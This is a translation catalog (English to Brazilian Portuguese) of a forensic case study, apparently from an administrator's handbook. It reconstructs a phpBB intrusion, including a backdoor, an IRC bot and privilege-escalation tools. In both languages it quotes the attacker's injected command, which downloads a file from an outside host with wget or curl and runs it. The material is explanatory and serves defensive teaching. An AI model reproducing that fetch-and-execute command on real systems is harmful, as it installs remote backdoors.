Repository: binary-com/mobile
Catalog: */14_security.po
Languages: pt_br

source: The following log is an extract from an Apache <filename>access.log</filename>:
pt_br: O registo seguinte foi extraido de um Apache <filename>access.log</filename>:

source: This example matches exploitation of an old security vulnerability in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
pt_br: Este exemplo corresponde a exploração de uma antiga vulnerabilidade de segurança em phpBB.<ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />

source: Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor.
pt_br: Decodificar esta longa URL leva ao entendimento de que o atacante conseguiu executar algum código PHP, chamado: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Na verdade, um arquivo <filename>bd</filename> foi encontrado em <filename>/tmp/</filename>. Executando <command>strings /mnt/tmp/bd</command> retorna, entre outros textos, <literal>PsychoPhobia Backdoor is starting...</literal> Isso realmente parece um backdoor.

source: Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:
pt_br: Algum tempo depois, esse acesso foi usado para fazer o download, instalar e executar um <emphasis>bot - robô</emphasis> de IRC, conectado a uma rede IRC subterrânea. O robô pode então ser controlado através deste protocolo e instruido realizar download de arquivos para compartilhamento. Este programa ainda tem o seu próprio arquivo de log:

source: These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address.
pt_br: Esses registros mostram que dois arquivos de vídeo foram armazenados no servidor por meio do endereço IP 82.50.72.202.

source: In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach.
pt_br: Em paralelo, o atacante também baixou um par de arquivos adicionais, <filename>/tmp/pt</filename> e <filename>/tmp/loginx</filename>. Executando esses arquivos através do <command>strings</command> resulta sequências de caracteres como <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> e <foreignphrase>Now wait for suid shell...</foreignphrase>. Estes parecem programas que exploram vulnerabilidades locais para obter privilégios administrativos. Será que chegam ao seu destino? Neste caso, provavelmente não, uma vez que nenhum arquivo parece ter sido modificado após a violação inicial.

source: In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability.
pt_br: Neste exemplo, a intrusão toda foi reconstruída, e pode-se deduzir que o invasor foi capaz de tirar vantagem do sistema comprometido por cerca de três dias, mas o elemento mais importante na análise é que a vulnerabilidade tenha sido identificada, e o administrador pode esta certo de que a nova instalação realmente corrigiu a vulnerabilidade.
